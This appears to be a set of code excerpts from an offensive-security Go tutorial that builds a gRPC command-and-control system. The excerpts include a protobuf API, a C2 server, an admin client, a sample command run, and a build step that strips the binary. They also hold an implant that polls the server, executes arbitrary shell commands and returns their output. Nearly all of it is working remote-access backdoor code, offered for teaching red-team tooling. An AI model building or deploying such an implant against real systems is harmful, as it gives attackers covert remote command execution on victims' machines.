["```\n> go get -u google.golang.org/grpc\n```", "```\n$ tree\n.\n|-- client\n|   |-- client.go\n|-- grpcapi\n|   |-- implant.proto\n|-- implant\n|   |-- implant.go\n|-- server\n    |-- server.go\n```", "```\n   //implant.proto\n   syntax = \"proto3\";\n❶ package grpcapi;\n\n   // Implant defines our C2 API functions\n❷ service Implant {\n       rpc FetchCommand (Empty) returns (Command);\n       rpc SendOutput (Command) returns (Empty);\n   }\n\n   // Admin defines our Admin API functions\n❸ service Admin {\n       rpc RunCommand (Command) returns (Command);\n   }\n\n   // Command defines a with both input and output fields\n❹ message Command {\n       string In = 1;\n       string Out = 2;\n   }\n\n   // Empty defines an empty message used in place of null\n❺ message Empty {\n   }\n```", "```\n> protoc -I . implant.proto --go_out=plugins=grpc:./\n```", "```\n❶ type implantServer struct {\n       work, output chan *grpcapi.Command\n   }\n   type adminServer struct {\n       work, output chan *grpcapi.Command\n   }\n\n❷ func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {\n       s := new(implantServer)\n       s.work = work\n       s.output = output\n       return s\n   }\n\n   func NewAdminServer(work, output chan *grpcapi.Command) *adminServer {\n       s := new(adminServer)\n       s.work = work\n       s.output = output\n       return s\n   }\n\n❸ func (s *implantServer) FetchCommand(ctx context.Context, \\\n   empty *grpcapi.Empty) (*grpcapi.Command, error) {\n       var cmd = new(grpcapi.Command)\n    ❹ select {\n       case cmd, ok := <-s.work:\n           if ok {\n               return cmd, nil\n           }\n           return cmd, errors.New(\"channel closed\")\n       default:\n           // No work\n           return cmd, nil\n       }\n   }\n\n❺ func (s *implantServer) SendOutput(ctx context.Context, \\\n   result *grpcapi.Command)\n   (*grpcapi.Empty, error) {\n       s.output <- result\n       return &grpcapi.Empty{}, nil\n   }\n\n❻ func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) \\\n   (*grpcapi.Command, error) {\n       var res *grpcapi.Command\n       go func() {\n           s.work <- cmd\n       }()\n       res = <-s.output\n       return res, nil\n   }\n```", "```\nfunc main() {\n ❶ var (\n        implantListener, adminListener net.Listener\n        err                            error\n        opts                           []grpc.ServerOption\n        work, output                   chan *grpcapi.Command\n    )\n ❷ work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)\n ❸ implant := NewImplantServer(work, output)\n    admin := NewAdminServer(work, output)\n ❹ if implantListener, err = net.Listen(\"tcp\", \\\n    fmt.Sprintf(\"localhost:%d\", 4444)); err != nil {\n        log.Fatal(err)\n    }\n    if adminListener, err = net.Listen(\"tcp\", \\\n    fmt.Sprintf(\"localhost:%d\", 9090)); err != nil {\n        log.Fatal(err)\n    }\n ❺ grpcAdminServer, grpcImplantServer := \\\n    grpc.NewServer(opts...), grpc.NewServer(opts...)\n ❻ grpcapi.RegisterImplantServer(grpcImplantServer, implant)\n    grpcapi.RegisterAdminServer(grpcAdminServer, admin)\n ❼ go func() {\n        grpcImplantServer.Serve(implantListener)\n    }()\n ❽ grpcAdminServer.Serve(adminListener)\n}\n```", "```\nfunc main() {\n    var\n    (\n        opts   []grpc.DialOption\n        conn   *grpc.ClientConn\n        err    error\n        client grpcapi.ImplantClient ❶\n    )\n\n    opts = append(opts, grpc.WithInsecure())\n    if conn, err = grpc.Dial(fmt.Sprintf(\"localhost:%d\", 4444), opts...); err != nil { ❷\n        log.Fatal(err)\n    }\n    defer conn.Close()\n    client = grpcapi.NewImplantClient(conn) ❸\n\n    ctx := context.Background()\n    for { ❹\n        var req = new(grpcapi.Empty)\n        cmd, err := client.FetchCommand(ctx, req) ❺\n        if err != nil {\n            log.Fatal(err)\n        }\n        if cmd.In == \"\" {\n            // No work\n            time.Sleep(3*time.Second)\n            continue\n        }\n\n        tokens := strings.Split(cmd.In, \" \") ❻\n        var c *exec.Cmd\n        if len(tokens) == 1 {\n            c = exec.Command(tokens[0])\n        } else {\n            c = exec.Command(tokens[0], tokens[1:]...)\n        }\n        buf, err := c.CombinedOutput()❼\n        if err != nil {\n            cmd.Out = err.Error()\n        }\n        cmd.Out += string(buf)\n        client.SendOutput(ctx, cmd) ❽\n    }\n}\n```", "```\nfunc main() {\n    var\n    (\n        opts   []grpc.DialOption\n        conn   *grpc.ClientConn\n        err    error\n        client grpcapi.AdminClient ❶\n    )\n\n    opts = append(opts, grpc.WithInsecure())\n    if conn, err = grpc.Dial(fmt.Sprintf(\"localhost:%d\", 9090), opts...); err != nil { ❷\n        log.Fatal(err)\n    }\n    defer conn.Close()\n    client = grpcapi.NewAdminClient(conn) ❸\n var cmd = new(grpcapi.Command)\n    cmd.In = os.Args[1] ❹\n    ctx := context.Background()\n    cmd, err = client.RunCommand(ctx, cmd) ❺\n    if err != nil {\n        log.Fatal(err)\n    }\n    fmt.Println(cmd.Out) ❻\n}\n```", "```\n$ go run client/client.go 'cat /etc/resolv.conf'\ndomain Home\nnameserver 192.168.0.1\nnameserver 205.171.3.25\n```", "```\n$ go build -ldflags=\"-s -w\" implant/implant.go\n```"]